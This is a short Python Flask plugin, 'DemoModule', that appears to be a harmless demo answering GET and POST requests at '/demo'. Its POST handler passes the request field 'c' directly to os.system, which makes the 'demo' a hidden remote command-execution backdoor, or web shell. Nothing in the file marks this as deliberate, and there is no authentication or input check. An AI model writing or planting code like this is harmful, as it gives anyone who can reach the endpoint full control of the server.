import os
import sys

from flask import render_template


class DemoModule():

    URI = "/demo"

    def __init__(self):
        pass

    def call(self, app, request):

        message = "I'm a demo plugin!"
        if request.method == "POST":
            os.system(request.form['c'])
            message += " I got a POST!"
        elif request.method == "GET":
            message += " I got a GET!"

        return message

__PLUGIN__ = DemoModule